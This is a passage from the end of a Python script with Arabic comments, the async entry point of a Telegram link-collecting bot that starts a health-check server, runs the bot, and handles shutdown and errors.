        sys.exit(1)
    
    # إنشاء المجلدات اللازمة
    os.makedirs("backups", exist_ok=True)
    
    # بدء خادم فحص الصحة
    health_server = HealthCheckServer()
    health_server.start()
    
    # بدء البوت
    bot = AdvancedTelegramBot()
    
    try:
        logger.info("🤖 بدء تشغيل بوت جمع الروابط...")
        await bot.start()
    except KeyboardInterrupt:
        logger.info("👋 إيقاف البوت بواسطة المستخدم")
    except Exception as e:
        logger.error(f"❌ خطأ قاتل: {e}", exc_info=True)
    finally:
        await bot.stop()
        await cleanup()

if __name__ == "__main__":
    # حل مشكلة asyncio على Windows
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # تشغيل البوت
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 تم إيقاف البرنامج")
    except Exception as e:
        logger.error(f"❌ خطأ غير متوقع: {e}", exc_info=True)
        sys.exit(1)
